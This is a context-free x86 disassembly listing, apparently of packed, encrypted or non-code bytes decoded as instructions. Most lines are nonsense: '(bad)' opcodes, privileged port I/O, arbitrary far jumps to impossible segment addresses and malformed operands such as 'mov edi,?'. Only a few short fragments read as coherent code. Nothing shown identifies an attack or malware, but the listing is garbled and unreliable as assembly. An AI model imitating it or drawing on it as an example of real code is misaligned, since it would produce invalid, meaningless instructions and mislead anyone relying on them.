  412325:	hlt    
  412326:	scas   al,BYTE PTR es:[edi]
  412327:	xlat   BYTE PTR ds:[ebx]
  412328:	fisttp DWORD PTR [ebp+0x66]
  41232b:	or     ah,BYTE PTR [edx-0x43]
  41232e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41232f:	nop
  412330:	dec    ecx
  412331:	cdq    
  412332:	dec    ecx
  412333:	fs pushf 
  412335:	push   edx
  412336:	outs   dx,DWORD PTR ds:[esi]
  412337:	jl     0x4123a5
  412339:	aam    0xf7
  41233b:	jns    0x4122c0
  41233d:	push   0x1f
  41233f:	pop    eax
  412340:	inc    ebp
  412341:	push   ebx
  412342:	sbb    eax,0x830e9ed9
  412347:	lods   eax,DWORD PTR ds:[esi]
  412348:	les    esi,FWORD PTR [ebx-0x4b3f78e1]
  41234e:	xor    ebx,DWORD PTR [ebx+0x21d67e0b]
  412354:	and    dl,cl
  412356:	xor    eax,DWORD PTR [esi]
  412358:	stos   DWORD PTR es:[edi],eax
  412359:	xchg   edx,eax
  41235a:	adc    DWORD PTR [eax+0x310eebfb],eax
  412360:	ss add eax,0x8f8ca9e0
  412366:	fucom  st(4)
  412368:	cmp    eax,0xa6ff0895
  41236d:	mov    ch,bl
  41236f:	fist   WORD PTR [ebp+0x9b5dbd9]
  412375:	mov    al,ds:0xc8906090
  41237a:	lods   al,BYTE PTR ds:[esi]
  41237b:	pop    ss
  41237c:	jae    0x4123e7
  41237e:	jb     0x4123ad
  412380:	push   0xffffffbc
  412382:	jmp    0x1c2d:0x6aa56a2c
  412389:	add    BYTE PTR ds:[eax+0x52c8c319],bh
  412390:	pop    ebx
  412391:	outs   dx,DWORD PTR ds:[esi]
  412392:	mov    al,0x29
  412394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412395:	ds ret 0x367f
  412399:	or     esp,DWORD PTR [edx-0x491f07f]
  41239f:	pop    ecx
  4123a0:	idiv   BYTE PTR [ecx+0x17]
  4123a3:	sub    BYTE PTR [ebx],0x3d
  4123a6:	jbe    0x412332
  4123a8:	jno    0x4123ae
  4123aa:	jle    0x4123af
  4123ac:	xchg   BYTE PTR [esi-0x90c026f],bl
  4123b2:	enter  0x569b,0xb2
  4123b6:	lock shr BYTE PTR [eax-0x3be748d3],0x4c
  4123be:	inc    eax
  4123bf:	aad    0x8
  4123c1:	dec    esi
  4123c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123c3:	xchg   ecx,eax
  4123c4:	mov    ch,0xb5
  4123c6:	adc    DWORD PTR [ebx+edx*1+0x7e],0x5b
  4123cb:	cmp    ebp,edi
  4123cd:	sub    dh,BYTE PTR [ebp+0x6b36bb43]
  4123d3:	loope  0x412416
  4123d5:	in     al,0x47
  4123d7:	shr    ebx,cl
  4123d9:	lds    esp,FWORD PTR [edx+0x18]
  4123dc:	(bad)  
  4123dd:	jecxz  0x412366
  4123df:	push   ds
  4123e0:	push   esp
  4123e1:	push   ebx
  4123e2:	dec    esp
  4123e3:	(bad)  
  4123e4:	xchg   ebx,eax
  4123e5:	jb     0x4123ba
  4123e7:	push   edi
  4123e8:	jno    0x41238d
  4123ea:	gs (bad) 
  4123ec:	(bad)  
  4123ee:	pop    ecx
  4123ef:	jg     0x41237c
  4123f1:	jp     0x4123fb
  4123f3:	stc    
  4123f4:	les    ebp,FWORD PTR [edi+0x5a]
  4123f7:	repz sar BYTE PTR [ecx+edi*2],1
  4123fb:	ins    DWORD PTR es:[edi],dx
  4123fc:	jne    0x4123b7
  4123fe:	adc    eax,0x5dd8680
  412403:	aad    0x9
  412405:	mov    ds:0xafc84e8a,al
  41240a:	mov    ah,0x1
  41240c:	in     eax,0xd3
  41240e:	and    DWORD PTR [ebx+0x44b4529],ebx
  412414:	rol    BYTE PTR ds:0xb4c874f1,cl
  41241a:	into   
  41241b:	lods   al,BYTE PTR ds:[esi]
  41241c:	pop    ebx
  41241d:	mov    bl,0x82
  41241f:	ficomp WORD PTR [esi+0x4ac346ad]
  412425:	ins    BYTE PTR es:[edi],dx
  412426:	leave  
  412427:	mov    edi,?
  412429:	sbb    eax,0x604e40fa
  41242e:	sbb    DWORD PTR [edx-0x3c760da],0x2
  412435:	inc    ebx
  412436:	scas   al,BYTE PTR es:[edi]
  412437:	pop    eax
  412438:	call   0x4293:0x5bae6628
  41243f:	ficomp DWORD PTR [ebx+eiz*8-0x9]
  412443:	xor    DWORD PTR [ebx+0x48f6c7ea],eax
  412449:	sbb    ebx,DWORD PTR [ecx]
  41244b:	popf   
  41244c:	ret    
  41244d:	adc    al,0xca
  41244f:	lock data16 add BYTE PTR [edi],al
  412453:	or     eax,0xdf845464
  412458:	adc    DWORD PTR [esi+0x45bd1328],esp
  41245e:	xor    ah,BYTE PTR [esi+0x16]
  412461:	sahf   
  412462:	popf   
  412463:	pop    edi
  412464:	shl    DWORD PTR ds:0x61d3ee17,cl
  41246a:	push   esp
  41246b:	pop    esp
  41246c:	(bad)  
  41246d:	enter  0x9ade,0xc0
  412471:	push   cs
  412472:	jne    0x4124b2
  412474:	and    eax,0x2b08184a
  412479:	retf   
  41247a:	xchg   ebp,edi
  41247c:	pop    ss
  41247d:	xchg   edi,eax
  41247e:	xchg   ebp,eax
  41247f:	lea    esi,[ecx-0x6f23581e]
  412485:	in     eax,0x64
  412487:	stos   DWORD PTR es:[edi],eax
  412488:	cmp    edi,DWORD PTR [esp+ecx*4+0x66ad0992]
  41248f:	ret    0xfdce
  412492:	mov    edi,0x24a01ee1
  412497:	mul    BYTE PTR [edx+0x23b47a64]
  41249d:	mov    dh,0x36
  41249f:	das    
  4124a0:	mov    esp,0x2f22b5
  4124a5:	scas   al,BYTE PTR es:[edi]
  4124a6:	stos   DWORD PTR es:[edi],eax
  4124a7:	repz or BYTE PTR [eax],cl
  4124aa:	mov    DWORD PTR [ebp-0x1c],edx
  4124ad:	jmp    0x412735
  4124b2:	iret   
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0x3d1ebe60
  4124bf:	push   es
  4124c0:	mov    edi,0x786e3df6
  4124c5:	js     0x4124ac
  4124c7:	jle    0x412541
  4124c9:	js     0x412452
  4124cb:	shr    BYTE PTR [edx*8-0x4aaa1c69],cl
  4124d2:	dec    esi
  4124d3:	adc    ebx,DWORD PTR [esi]
  4124d5:	push   edx
  4124d6:	fdiv   st,st(1)
  4124d8:	cwde   
  4124d9:	bound  eax,QWORD PTR [ecx]
  4124db:	push   0xbc06a87e
  4124e0:	ret    0xfb14
  4124e3:	rcr    DWORD PTR [ebx-0x19e4c9a0],cl
  4124e9:	mov    edx,eax
  4124eb:	or     esi,DWORD PTR [ecx]
  4124ed:	aad    0xc4
  4124ef:	je     0x4124ae
  4124f1:	rol    BYTE PTR [ecx-0x22],0x8f
  4124f5:	jbe    0x412539
  4124f7:	sbb    eax,0xbd62ef44
  4124fc:	mov    edi,0xd26a22ea
  412501:	xlat   BYTE PTR ds:[ebx]
  412502:	add    DWORD PTR [edi+0x6470f515],esi
  412508:	dec    edx
  412509:	aam    0x48
  41250b:	or     cl,al
  41250d:	pop    ds
  41250e:	xchg   edx,eax
  41250f:	push   ebx
  412510:	mov    edx,0xf3f5d3b1
  412515:	mov    al,ds:0x54d6a78e
  41251a:	scas   eax,DWORD PTR es:[edi]
  41251b:	dec    esi
  41251c:	stc    
  41251d:	cmp    eax,0xfadc5e14
  412522:	inc    esp
  412523:	js     0x41253f
  412525:	mov    esi,0x24e9d588
  41252a:	shl    ebp,cl
  41252c:	inc    esp
  41252d:	inc    edx
  41252e:	push   esp
  41252f:	cli    
  412530:	out    0x9e,eax
  412532:	cmp    DWORD PTR [ebp-0x35],0x3f
  412536:	loope  0x4124bf
  412538:	test   eax,0x16f93b5a
  41253d:	jl     0x412556
  41253f:	pop    eax
  412540:	xor    esp,DWORD PTR [esi]
  412542:	shl    DWORD PTR [esi+0xeb40c33],0x34
  412549:	(bad)  
  41254a:	std    
  41254b:	push   edi
  41254c:	cmp    eax,0x6ee10793
  412551:	or     al,0xf3
  412553:	push   es
  412554:	adc    al,0xf0
  412556:	mov    eax,0xd7c77ff4
  41255b:	(bad)  
  41255c:	test   al,0xab
  41255e:	inc    ebp
  41255f:	inc    edi
  412560:	imul   ebp,DWORD PTR [ebx+0x1f],0x957c578f
  412567:	ins    DWORD PTR es:[edi],dx
  412568:	sbb    dh,ah
  41256a:	jne    0x412530
  41256c:	mov    cl,0x3
  41256e:	enter  0x27e,0xe4
  412572:	repz and eax,DWORD PTR [esi+0xa8110a0]
  412579:	sbb    BYTE PTR [esi+0x5381c1ee],dh
  41257f:	out    dx,al
  412580:	inc    ebp
  412581:	dec    edi
  412582:	bnd jno 0x412588
  412585:	sub    eax,0x446fd2e1
  41258a:	pop    ss
  41258b:	sub    bh,cl
  41258d:	into   
  41258e:	mov    edx,0xce25cb80
  412593:	push   eax
  412594:	or     BYTE PTR [ebp+0x1d],ah
  412597:	jbe    0x41252d
  412599:	inc    ebp
  41259a:	mov    fs,WORD PTR [edx-0x74]
  41259d:	push   0x44dcc98e
  4125a2:	add    BYTE PTR ds:0xd418363,bh
  4125a8:	loopne 0x41253b
  4125aa:	aam    0x62
  4125ac:	mov    eax,0xcd44a47
  4125b1:	test   bl,dl
  4125b3:	push   esp
  4125b4:	ja     0x4125f6
  4125b6:	in     eax,0xd5
  4125b8:	jnp    0x412555
  4125ba:	mov    DWORD PTR [ebp+esi*2+0x35],esp
  4125be:	retf   0xa4e7
  4125c1:	lahf   
  4125c2:	xchg   BYTE PTR [esi+0xc],dl
  4125c5:	dec    ebp
  4125c6:	(bad)  
  4125c7:	call   DWORD PTR [esi+0xfa54095]
  4125cd:	ins    DWORD PTR es:[edi],dx
  4125ce:	ins    DWORD PTR es:[edi],dx
  4125cf:	or     DWORD PTR [ecx],esi
  4125d1:	mov    DWORD PTR [ebx-0x1f23687b],esi
  4125d7:	out    0x5f,eax
  4125d9:	xchg   ecx,eax
  4125da:	je     0x41262f
  4125dc:	add    BYTE PTR ss:[ebx-0x6fc2ff41],dl
  4125e3:	sahf   
  4125e4:	fadd   DWORD PTR [eax-0x43]
  4125e7:	and    edx,DWORD PTR [eax-0xd66058f]
  4125ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125ee:	xchg   edx,eax
  4125ef:	pop    ds
  4125f0:	or     BYTE PTR [ecx+0x50],dh
  4125f3:	cld    
  4125f4:	xchg   ecx,eax
  4125f5:	add    BYTE PTR [ecx+0x5a],bl
  4125f8:	jecxz  0x41261f
  4125fa:	inc    esi
  4125fb:	icebp  
  4125fc:	repz cld 
  4125fe:	pop    ecx
  4125ff:	rcl    DWORD PTR [edi],0xff
  412602:	push   edi
  412603:	or     esp,edi
  412605:	jae    0x4125f2
  412607:	fdivrp st(5),st
  412609:	loop   0x412660
  41260b:	or     DWORD PTR [edx-0xd],eax
  41260e:	dec    esi
  41260f:	or     BYTE PTR [edi-0x7a],bl
  412612:	stc    
  412613:	scas   eax,DWORD PTR es:[edi]
  412614:	or     eax,0x3acd8f
  412619:	dec    edx
  41261a:	out    0x84,eax
  41261c:	cmp    ch,BYTE PTR [ecx+0x6ca0cb9b]
  412622:	pop    edi
  412623:	dec    ecx
  412624:	repnz fcomp DWORD PTR ds:0x61c37c09
  41262b:	jno    0x4125e1
  41262d:	in     al,0xd
  41262f:	jmp    0xf783:0x7447a9eb
  412636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412637:	sahf   
  412638:	arpl   bp,dx
  41263a:	jp     0x412665
  41263c:	(bad)  [edi+ecx*8-0x77]
  412640:	test   DWORD PTR [ebp-0x6ef989f],edi
  412646:	lods   al,BYTE PTR ds:[esi]
  412647:	add    esp,0xfffffff3
  41264a:	mov    edi,0x9b0a5495
  41264f:	shl    BYTE PTR [edx-0x1e5a31bd],1
  412655:	in     eax,0xf7
  412657:	pop    ecx
  412658:	cld    
  412659:	es (bad) 
  41265b:	jmp    0x12bb:0xef785bd9
  412662:	push   edx
  412663:	push   edx
  412664:	xchg   esp,eax
  412665:	rcl    DWORD PTR [esi+0x47f92f11],1
  41266b:	pop    ebx
  41266c:	dec    ebp
  41266d:	stos   BYTE PTR es:[edi],al
  41266e:	aad    0xa8
  412670:	cmp    eax,0x3a5b2205
  412675:	addr16 cld 
  412677:	jmp    0x8810:0x8c0eba41
  41267e:	mov    ss,WORD PTR [ecx]
  412680:	mov    BYTE PTR [ecx-0x61f94034],dh
  412686:	or     eax,DWORD PTR [esi+0x7e1bcc0e]
  41268c:	outs   dx,DWORD PTR ds:[esi]
  41268d:	dec    edi
  41268e:	scas   al,BYTE PTR es:[edi]
  41268f:	pushf  
  412690:	in     eax,0xe7
  412692:	int    0xf8
  412694:	jo     0x41265c
  412696:	inc    eax
  412697:	sub    eax,0xaabc8327
  41269c:	enter  0x1af8,0x59
  4126a0:	push   edx
  4126a1:	push   esp
  4126a2:	inc    esi
  4126a3:	jne    0x41271f
  4126a5:	push   0x57
  4126a7:	cdq    
  4126a8:	call   0x5282:0xba34ceda
  4126af:	push   esi
  4126b0:	cmp    eax,0xe87a5465
  4126b5:	mov    ah,0x14
  4126b7:	and    eax,0x14185cbf
  4126bc:	push   ebx
  4126bd:	daa    
  4126be:	ja     0x412683
  4126c0:	fwait
  4126c1:	icebp  
  4126c2:	loopne 0x412652
  4126c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126c5:	jno    0x41269f
  4126c7:	xor    eax,DWORD PTR [eax+0x32]
  4126ca:	call   0x4cfcf509
  4126cf:	icebp  
  4126d0:	shl    al,0xaa
  4126d3:	mov    ecx,0x79fb9c6c
  4126d8:	mov    ds:0xce68117e,al
  4126dd:	(bad)  
  4126de:	adc    bl,BYTE PTR [edi]
  4126e0:	repnz fwait
  4126e2:	pop    ebp
  4126e3:	pop    ecx
  4126e4:	pop    esi
  4126e5:	cmp    DWORD PTR [ecx-0x3c75045e],0xb548aa67
  4126ef:	(bad)  [edx-0x6bf9b808]
  4126f5:	jge    0x412736
  4126f7:	dec    esp
  4126f8:	ret    
  4126f9:	nop
  4126fa:	xor    ebp,DWORD PTR [edx*1+0x2d4adec4]
  412701:	enter  0xaab6,0x0
  412705:	ficom  DWORD PTR [eax]
  412707:	sub    eax,0x87b070a2
  41270c:	es inc ebp
  41270e:	shl    esp,1
  412710:	jmp    0x437f:0x1725c6fb
  412717:	mov    ah,BYTE PTR [eax-0x11]
  41271a:	or     si,WORD PTR [edx]
  41271d:	jo     0x412779
  41271f:	sub    esi,esp
  412721:	je     0x4126be
  412723:	ss push es
  412725:	stos   DWORD PTR es:[edi],eax
  412726:	loopne 0x41273e
  412728:	outs   dx,DWORD PTR ds:[esi]
  412729:	iret   
  41272a:	stos   BYTE PTR es:[edi],al
  41272b:	mov    bl,0x95
  41272d:	dec    DWORD PTR [ebx+0xe]
  412730:	and    ecx,DWORD PTR [ebx]
  412732:	mov    cl,0x18
  412734:	push   es
  412735:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  41273c:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	sub    edx,DWORD PTR [esp+ecx*2+0x786caaa4]
  41275b:	js     0x412742
  41275d:	jle    0x4127d7
  41275f:	js     0x4126ef
  412761:	inc    edi
  412762:	jge    0x4127aa
  412764:	push   edx
  412765:	pop    esi
  412766:	adc    eax,0x9f3b3a0b
  41276b:	pop    ds
  41276c:	(bad)  
  41276d:	outs   dx,DWORD PTR ds:[esi]
  41276e:	ins    DWORD PTR es:[edi],dx
  41276f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412770:	das    
  412771:	call   0x8c89820f
  412776:	jp     0x412762
  412778:	sbb    al,0xf1
  41277a:	add    DWORD PTR [edx-0x55],edi
  41277d:	mov    dl,0xc4
  41277f:	xchg   ebx,eax
  412780:	sti    
  412781:	adc    eax,DWORD PTR [ebp-0x4]
  412784:	shr    DWORD PTR [ebx],0x73
  412787:	(bad)  
  412788:	in     al,dx
  412789:	popf   
  41278a:	fist   DWORD PTR [ebp+0x67]
  41278d:	mov    ds:0x23d79505,al
  412792:	inc    eax
  412793:	xor    bh,BYTE PTR [ebx-0x1fb3a6d8]
  412799:	test   eax,0x29d5d8d0
  41279e:	lock jp 0x412766
  4127a1:	jmp    0x93ce:0x6118db9d
  4127a8:	and    DWORD PTR [ecx-0x8350715],0x3
  4127af:	or     eax,ebx
  4127b1:	popa   
  4127b2:	ds lock push edi
  4127b5:	lea    ecx,[esp+eiz*4]
  4127b8:	inc    ebx
  4127b9:	nop
  4127ba:	jl     0x412784
  4127bc:	mov    ebp,0xe6bf9de4
  4127c1:	pop    esi
  4127c2:	xchg   esp,eax
  4127c3:	adc    al,0x3c
  4127c5:	jmp    0xbb0e:0xd493183f
  4127cc:	mov    dl,0x1b
  4127ce:	jns    0x4127a9
  4127d0:	gs mov ah,0xf4
  4127d3:	les    ebx,FWORD PTR [esi+0xf8e47d4]
  4127d9:	dec    esp
  4127da:	les    edx,FWORD PTR [eax]
  4127dc:	mov    eax,ds:0xde7710e1
  4127e1:	push   esi
  4127e2:	xchg   esi,eax
  4127e3:	sub    bh,ch
  4127e5:	repz les ebx,FWORD PTR [edi+0x7c2fa2e7]
  4127ec:	jecxz  0x412814
  4127ee:	je     0x4127bb
  4127f0:	(bad)  
  4127f3:	xlat   BYTE PTR ds:[ebx]
  4127f4:	cmp    BYTE PTR [ecx],0x2c
  4127f7:	xchg   ebp,eax
  4127f8:	rol    DWORD PTR [ebx+edx*4],0x1f
  4127fc:	leave  
  4127fd:	addr16 das 
  4127ff:	or     al,0xd
  412801:	mov    edx,0x88a176e2
  412806:	cmp    esp,ebx
  412808:	mov    ?,WORD PTR [ebp+0x245330c2]
  41280e:	sub    eax,0x61dc0915
  412813:	xor    al,0x6b
  412815:	push   ecx
  412816:	addr16 pop ds
  412818:	pusha  
  412819:	in     eax,0x32
  41281b:	adc    edx,edi
  41281d:	and    BYTE PTR [edi],0x9d
  412820:	fiadd  DWORD PTR [edi-0x7d]
  412823:	jp     0x412843
  412825:	cld    
  412826:	repnz ffreep st(5)
  412829:	push   es
  41282a:	ss aaa 
  41282c:	push   cs
  41282d:	mov    eax,0x6b0b70e7
  412832:	dec    esi
  412833:	leave  
  412834:	shl    edx,0x61
  412837:	jle    0x41284c
  412839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41283a:	dec    eax
  41283b:	pop    DWORD PTR [edx+0x53]
  41283e:	jl     0x4127de
  412840:	in     eax,0x7e
  412842:	lods   eax,DWORD PTR ds:[esi]
  412843:	sahf   
  412844:	ror    ebx,1
  412846:	jg     0x41282e
  412848:	mov    edx,ebp
  41284a:	mov    dh,0x54
  41284c:	in     eax,0xe9
  41284e:	les    ebx,FWORD PTR [ebp-0xd8c5406]
  412854:	cmp    esi,edx
  412856:	retf   0x7eb0
  412859:	ins    DWORD PTR es:[edi],dx
  41285a:	push   eax
  41285b:	sub    edx,eax
  41285d:	pop    esi
  41285e:	sar    edx,cl
  412860:	mov    DWORD PTR [esp+ebx*8+0x59e79b9c],esi
  412867:	dec    ebx
  412868:	dec    esi
  412869:	bound  edi,QWORD PTR [ebx+0x3c8e0f69]
  41286f:	inc    edx
  412870:	xchg   esi,eax
  412871:	jmp    0xdc1ce6f2
  412876:	add    BYTE PTR [edi-0x1804e727],al
  41287c:	mov    eax,0xf54c85db
  412881:	lahf   
  412882:	add    ah,BYTE PTR [ebx-0x48bc5760]
  412888:	jecxz  0x4128d4
  41288a:	aam    0xcd
  41288c:	pop    esi
  41288d:	cld    
  41288e:	adc    cl,ch
  412890:	stc    
  412891:	add    BYTE PTR [ecx+eiz*2-0x7c2f000e],ah
  412898:	xor    DWORD PTR [ebx+0x7516326c],ebx
  41289e:	push   ss
  41289f:	(bad)  
  4128a1:	mov    al,ds:0xba0a7c8f
  4128a6:	xlat   BYTE PTR ds:[ebx]
  4128a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128a8:	sub    al,0xdb
  4128aa:	and    dl,BYTE PTR [edx]
  4128ac:	sbb    eax,0x62e947db
  4128b1:	iret   
  4128b2:	pop    edx
  4128b3:	mov    ebx,0xc0623843
  4128b8:	dec    esi
  4128b9:	pushf  
  4128ba:	inc    edi
  4128bb:	lahf   
  4128bc:	rol    BYTE PTR [eax-0x735be780],0x7e
  4128c3:	push   edx
  4128c4:	clc    
  4128c5:	dec    eax
  4128c6:	xor    BYTE PTR [edi+0x2e],cl
  4128c9:	mov    BYTE PTR [edi+edi*8+0x56],0xa4
  4128ce:	xlat   BYTE PTR ds:[ebx]
  4128cf:	xchg   edi,eax
  4128d0:	dec    edi
  4128d1:	iret   
  4128d2:	retf   
  4128d3:	sbb    eax,0x6dd474f9
  4128d8:	retf   
  4128d9:	inc    edi
  4128da:	sbb    edi,DWORD PTR [edi+0x4]
  4128dd:	fdivr  DWORD PTR [eax-0x7f]
  4128e0:	ds je  0x412905
  4128e3:	inc    ebx
  4128e4:	adc    al,0x69
  4128e6:	nop
  4128e7:	outs   dx,BYTE PTR ds:[esi]
  4128e8:	repz cmp BYTE PTR [edx],0xc7
  4128ec:	pop    ds
  4128ed:	xor    esi,DWORD PTR [eax-0x46c78cfd]
  4128f3:	push   cs
  4128f4:	xchg   esi,eax
  4128f5:	mov    ecx,0x7c0a9a12
  4128fa:	daa    
  4128fb:	mov    BYTE PTR [edx+0x33],bh
  4128fe:	fsubr  DWORD PTR [edi-0x69]
  412901:	xor    al,0x50
  412903:	nop
  412904:	rcr    DWORD PTR [eax+0x6529a487],1
  41290a:	sub    bh,0xdf
  41290d:	or     ebp,DWORD PTR ds:0xc17ed5b9
  412913:	dec    edx
  412914:	imul   ecx,DWORD PTR [ebp+0x1b],0x18
  412918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412919:	out    0x59,al
  41291b:	and    ecx,esi
  41291d:	cld    
  41291e:	mov    ebx,DWORD PTR ds:0x4a0cfcc2
  412924:	jp     0x412902
  412926:	jl     0x412961
  412928:	mov    ebx,DWORD PTR [esi]
  41292a:	xchg   DWORD PTR [eax-0xf97448e],esp
  412930:	sub    eax,0x1bee12ea
  412935:	scas   al,BYTE PTR es:[edi]
  412936:	mov    ah,0xa
  412938:	test   DWORD PTR [esi+0xd34bc61],eax
  41293e:	retf   
  41293f:	add    cl,bh
  412941:	pop    es
  412942:	cwde   
  412943:	mov    DWORD PTR [esi+edx*4-0x21cefde7],edi
  41294a:	inc    ecx
  41294b:	adc    ebx,DWORD PTR [ecx]
  41294d:	push   edi
  41294e:	adc    eax,0x4d642684
  412953:	xchg   edi,eax
  412954:	ja     0x4128ea
  412956:	mov    dl,0xb6
  412958:	cli    
  412959:	adc    DWORD PTR [ebx+0x69],edx
  41295c:	cmp    esi,DWORD PTR [eax]
  41295e:	jb     0x4128fe
  412960:	repz dec ebx
  412962:	pop    esi
  412963:	ret    0x2133
  412966:	shr    DWORD PTR [esi],cl
  412968:	and    BYTE PTR [edx+ebp*8-0x5f],0xaa
  41296d:	out    0x1d,eax
  41296f:	cwde   
  412970:	adc    eax,0x945c2262
  412975:	loop   0x41291a
  412977:	dec    ebp
  412978:	(bad)  [eax+ecx*2-0x11]
  41297c:	leave  
  41297d:	fptan  
  41297f:	nop
  412980:	jecxz  0x412984
  412982:	lock leave 
  412984:	ror    BYTE PTR [eax+0x3f],cl
  412987:	inc    ecx
  412988:	adc    ch,BYTE PTR [ebp-0x28]
  41298b:	fsub   QWORD PTR [edi-0x6cba7ec9]
  412991:	sub    esp,DWORD PTR [eax]
  412993:	aam    0x3b
  412995:	outs   dx,BYTE PTR ds:[esi]
  412996:	rcl    BYTE PTR [ecx-0x3a],cl
  412999:	int    0x34
  41299b:	bound  edx,QWORD PTR [ecx-0x20c1beb9]
  4129a1:	ins    BYTE PTR es:[edi],dx
  4129a2:	loopne 0x412a05
  4129a4:	push   0x4536499a
  4129a9:	mov    bh,0x68
  4129ab:	cld    
  4129ac:	mov    al,ds:0x7fa2f99e
  4129b1:	sti    
  4129b2:	xor    ebp,DWORD PTR [ecx+0x9]
  4129b5:	test   dh,bl
  4129b7:	mov    esp,0xf0a5645d
  4129bc:	xor    BYTE PTR [esi-0x4c6bb026],0x56
  4129c3:	jns    0x41297b
  4129c5:	mov    bh,0xdb
  4129c7:	and    ebp,esp
  4129c9:	sub    al,0xb2
  4129cb:	mov    edx,DWORD PTR [ebp-0x18]
  4129ce:	xor    edx,eax
  4129d0:	add    edx,ecx
  4129d2:	jmp    0x41396f
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x4129f8
  4129f1:	or     BYTE PTR [esp+ebp*4+0x17],dl
  4129f5:	jno    0x412a6f
  4129f7:	js     0x4129de
  4129f9:	jle    0x412a73
  4129fb:	js     0x4129e2
  4129fd:	repz aaa 
  4129ff:	into   
  412a00:	xchg   ebp,eax
  412a01:	mov    esp,0x323dd56b
  412a06:	jl     0x412a42
  412a08:	sbb    DWORD PTR [ebx],esi
  412a0a:	sub    BYTE PTR [ebx],0x92
  412a0d:	pop    edx
  412a0e:	mov    ebp,0x87b6268a
  412a13:	ret    
  412a14:	sub    BYTE PTR [edx-0xe],ah
  412a17:	(bad)  
  412a18:	pop    edi
  412a19:	scas   eax,DWORD PTR es:[edi]
  412a1a:	jbe    0x412a63
  412a1c:	and    dh,al
  412a1e:	fidiv  WORD PTR [esi+edi*2]
  412a21:	in     al,dx
  412a22:	fs leave 
  412a24:	dec    edi
  412a25:	shl    BYTE PTR [ecx+edi*1-0x3a],1
  412a29:	or     eax,0x316e00f2
  412a2e:	pusha  
  412a2f:	or     al,BYTE PTR [eax]
  412a31:	push   esi
  412a32:	dec    edi
  412a33:	nop
  412a34:	call   0x1325adbe
  412a39:	outs   dx,BYTE PTR ds:[esi]
  412a3a:	push   edi
  412a3b:	ret    0xa106
  412a3e:	sbb    BYTE PTR [ebx+0x72],al
  412a41:	jmp    FWORD PTR [edi+0x7a]
  412a44:	add    eax,DWORD PTR [ecx]
  412a46:	xchg   ebp,eax
  412a47:	mov    al,ds:0x1e993168
  412a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a4d:	xchg   DWORD PTR [ebx+ebp*4-0x53],esp
  412a51:	rcr    BYTE PTR [edx-0x5e],cl
  412a54:	mov    cs,WORD PTR [edi+0x3d]
  412a57:	inc    ebx
  412a58:	fs jecxz 0x4129fc
  412a5b:	(bad)  
  412a5c:	daa    
  412a5d:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  412a5f:	mov    WORD PTR [eax+0x263d6e46],cs
  412a65:	in     al,dx
  412a66:	ror    BYTE PTR [ecx],0x7f
  412a69:	sub    esp,DWORD PTR [esp+edx*1]
  412a6c:	push   es
  412a6d:	jle    0x412ac4
  412a6f:	retf   
  412a70:	dec    esi
  412a71:	nop
  412a72:	jl     0x412ac0
  412a74:	jne    0x412a64
  412a76:	push   ecx
  412a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a78:	ret    
  412a79:	sbb    eax,0xeed925c8
  412a7e:	das    
  412a7f:	xchg   esi,eax
  412a80:	ret    0xbc32
  412a83:	dec    ebp
  412a84:	test   BYTE PTR [edx+0x18ae964f],bh
  412a8a:	push   edx
  412a8b:	fwait
  412a8c:	and    DWORD PTR [ebx+0x3b496b3f],0xbd1fa240
  412a96:	sub    BYTE PTR [ebx-0x9b83e01],0xa3
  412a9d:	es out dx,al
  412a9f:	xor    al,0x39
  412aa1:	scas   al,BYTE PTR es:[edi]
  412aa2:	push   0x73
  412aa4:	or     ecx,ebx
  412aa6:	push   esi
  412aa7:	and    BYTE PTR [edi-0x2e],0x9b
  412aab:	xchg   DWORD PTR [ecx-0x54],ebx
  412aae:	push   edi
  412aaf:	sub    eax,DWORD PTR [ecx-0x76]
  412ab2:	xchg   edi,eax
  412ab3:	xchg   BYTE PTR [ecx+ecx*1],dh
  412ab6:	xchg   ebx,eax
  412ab7:	repz (bad) 
  412aba:	inc    eax
  412abb:	jo     0x412a5c
  412abd:	retf   0x575c
  412ac0:	std    
  412ac1:	(bad)  
  412ac2:	xchg   ebx,eax
  412ac3:	xchg   BYTE PTR [ebx+0x20b32258],bl
  412ac9:	ja     0x412a95
  412acb:	test   ebp,edi
  412acd:	pop    ss
  412ace:	ficomp WORD PTR [ecx-0x1d085835]
  412ad4:	jmp    0xef45:0xf53c22a3
  412adb:	lods   eax,DWORD PTR ds:[esi]
  412adc:	mov    eax,ds:0xea3651f1
  412ae1:	sub    ebx,esi
  412ae3:	pop    ss
  412ae4:	or     eax,0xb8ab39dd
  412ae9:	add    esi,DWORD PTR ds:0x4b703c65
  412aef:	xchg   DWORD PTR [ecx+esi*1],esi
  412af2:	inc    ebp
  412af3:	aam    0x71
  412af5:	xchg   edi,eax
  412af6:	aam    0x58
  412af8:	dec    ecx
  412af9:	dec    ecx
  412afa:	(bad)  
  412afb:	out    dx,al
  412afc:	jmp    0x4aad:0xae62bdbe
  412b03:	and    BYTE PTR [eax+0x73694ea0],cl
  412b09:	fld    QWORD PTR [ecx]
  412b0b:	cmp    esi,edi
  412b0d:	stc    
